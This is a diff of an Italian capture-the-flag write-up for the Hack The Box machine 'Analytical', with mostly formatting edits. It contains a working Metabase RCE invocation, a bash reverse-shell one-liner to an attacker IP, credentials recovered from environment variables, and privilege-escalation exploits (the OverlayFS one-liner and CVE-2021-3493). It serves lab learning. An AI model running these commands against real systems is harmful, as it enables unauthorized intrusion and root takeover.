@@ -1,8 +1,11 @@
+# Analytical
+
 **TARGET:10.10.11.233**
 
-# INFORMATION GATHERING
+## INFORMATION GATHERING
 
 Per prima cosa lanciamo un rapido scan con [Nmap](Note/Tool/Nmap.md)
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/analytical]
 └─# nmap -sV -sC --min-rate=5000 10.10.11.233
@@ -26,23 +29,19 @@ Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
 
 Abbiamo 2 porte aprte
 
-- 22 ssh OpenSSH 8.9p1 (le vulnerabilità note sono per le versione precedneti)
-- 80 http nginx 1.18.0
+* 22 ssh OpenSSH 8.9p1 (le vulnerabilità note sono per le versione precedneti)
+* 80 http nginx 1.18.0
 
 uno scan completo su tutte le porte non ci da nessuna nuova informazione.
 
-# ENUMERATION
+## ENUMERATION
 
-# Port 80
+## Port 80
 
-Visitiamo `10.10.11.233` 
-![](../zzz_rev/attachments/analytican.png)
-notiamo subito il nome `analytical.htb` che aggiungiamo al nostro `etc/hosts`
-alla sezione `Contact` troviamo un email : demo@analytical.htb potrebbe essere utile.
+Visitiamo `10.10.11.233` ![](../zzz\_rev/attachments/analytican.png) notiamo subito il nome `analytical.htb` che aggiungiamo al nostro `etc/hosts` alla sezione `Contact` troviamo un email : demo@analytical.htb potrebbe essere utile.
 
-Alla sezione login veniamo reindirizzati al seguente pagine 
-![](../zzz_rev/attachments/analytical1.png)
-Notiamo l'indirizzo `data.analytical.htb` abbiamo un subdomino, possiamo verificalo anche con gobuster
+Alla sezione login veniamo reindirizzati al seguente pagine ![](../zzz\_rev/attachments/analytical1.png) Notiamo l'indirizzo `data.analytical.htb` abbiamo un subdomino, possiamo verificalo anche con gobuster
+
 ```bash
 
 ┌──(root㉿kali)-[/home/kali]
@@ -68,36 +67,37 @@ Progress: 600 / 4990 (12.02%)^C
 ===============================================================
 ```
 
-# GAINING AN INITIAL FOOTHOLD 
+## GAINING AN INITIAL FOOTHOLD
 
 Ho provato ad accedere col credenziali standard come admim:admin, ecc.. e anche l'indirizzo email trovato in precedenza ma non ho ottenuto nessun accesso.
 
-Notiamo che il software si chiama Metabase cerchiamo su google se troviamo qualcosa 
-Ho trovato [questa](https://github.com/m3m0o/metabase-pre-auth-rce-poc) repo su git hub dove si fa riferimento alla  CVE-2023-38646 Metabase Pre-Auth RCE 
+Notiamo che il software si chiama Metabase cerchiamo su google se troviamo qualcosa Ho trovato [questa](https://github.com/m3m0o/metabase-pre-auth-rce-poc) repo su git hub dove si fa riferimento alla CVE-2023-38646 Metabase Pre-Auth RCE
 
 Scarichiamo e vediamo se funziona.
 
-Dalla info nel README.md  vediamo che lo script python a bisogno di 3 parametri 
-- -u = url 
-- -t = setup token
-- -c = command
+Dalla info nel README.md vediamo che lo script python a bisogno di 3 parametri
 
-il setup token  può essere ottenuto tramite l'endpoint /api/session/properties. 
-![](../zzz_rev/attachments/analytical3.htb.png)
+* \-u = url
+* \-t = setup token
+* \-c = command
+
+il setup token può essere ottenuto tramite l'endpoint /api/session/properties. ![](../zzz\_rev/attachments/analytical3.htb.png)
 
 come comando mettiamo la seguente revshell
+
 ```bash
 bash -i >& /dev/tcp/10.10.14.37/443 0>&1
 ```
 
-ci mettiamo in ascolto con nc 
+ci mettiamo in ascolto con nc
+
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/analytical]
 └─# nc -lvnp 443
 listening on [any] 443 ...
 ```
 
-impostiamo lo script e lo eseguiamo 
+impostiamo lo script e lo eseguiamo
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/analytical/metabase-pre-auth-rce-poc]
@@ -127,6 +127,7 @@ uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
 ```
 
 è una shell abbastanza limitata, come possiamo vedere con il comando ambiente `env`
+
 ```bash
 501f3d513028:/$ env
 env
@@ -161,8 +162,7 @@ _=/usr/bin/env
 501f3d513028:/$
 ```
 
-possiamo vedere che che abbiamo un nome utente `metalytics` e una password `An4lytics_ds20223#`
-Usiamole per collegarci tramite ssh
+possiamo vedere che che abbiamo un nome utente `metalytics` e una password `An4lytics_ds20223#` Usiamole per collegarci tramite ssh
 
 ```bash
 ┌──(root㉿kali)-[/home/kali/htb/analytical]
@@ -207,7 +207,7 @@ metalytics@analytics:~$metalytics@analytics:~$ id
 uid=1000(metalytics) gid=1000(metalytics) groups=1000(metalytics)
 ```
 
-Abbiamo la nostra user_flag
+Abbiamo la nostra user\_flag
 
 ```
 metalytics@analytics:~$ ls
@@ -216,9 +216,10 @@ metalytics@analytics:~$ cat user.txt
 5f6239bde86194fd50cef62db4123490
 ```
 
-# PRIVESC
+## PRIVESC
 
 Scarichiamo sulla macchina [LinEPAS.sh](LinEPAS.sh) ed eseguiamo, alla voce System information troviamo la versione di Linux Ubuntu 22.04.3 LTS
+
 ```bash
 ══════════════════════════════╣ System Information ╠══════════════════════════════
                               ╚════════════════════╝
@@ -231,12 +232,11 @@ Release:        22.04
 Codename:       jammy
 ```
 
-Cercano su google per la versione `Ubuntu 22.04.3 LTS` troviamo [Questo](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/) post
-dove si parla di due CVE. LA  [**CVE-2023–2640**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)e la  [**CVE-2023–32629**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/).
+Cercano su google per la versione `Ubuntu 22.04.3 LTS` troviamo [Questo](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/) post dove si parla di due CVE. LA  [**CVE-2023–2640**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/)e la  [**CVE-2023–32629**](https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/).
 
-## CVE -2023-2640
+### CVE -2023-2640
 
-Partiamo dalla prima 
+Partiamo dalla prima
 
 ```bash
 metalytics@analytics:~$ unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
@@ -252,14 +252,14 @@ uid=0(root) gid=1000(metalytics) groups=1000(metalytics)
 
 Nel mio caso, la CVE-2023–2640 si è rivelata subito efficace ed è stato ottenuto l'accesso root.
 
-e ci prendiamo la nostra root_flag
+e ci prendiamo la nostra root\_flag
+
 ```bash
 root@analytics:~# cat /root/root.txt
 5d94322c58e7914aea78481289b35403
 ```
 
-
-# CVE-2021-3493
+## CVE-2021-3493
 
 Cercando ancora su google troviamo anche questa [CVE-2021-3493](https://www.exploit-db.com/docs/49916) dove troviamo tutto il materiale per procedere.
 
@@ -274,7 +274,7 @@ una volta scaricato la repo da GitHub dobbiamo compilare l'exploit
 exploit  exploit.c  README.md
 ```
 
-lo copiamo sull target con wget ed eseguiamo 
+lo copiamo sull target con wget ed eseguiamo
 
 ```bahs
 metalytics@analytics:~$ ls
@@ -284,4 +284,3 @@ bash-5.1# id
 uid=0(root) gid=0(root) groups=0(root),1000(metalytics)
 
 ```
-
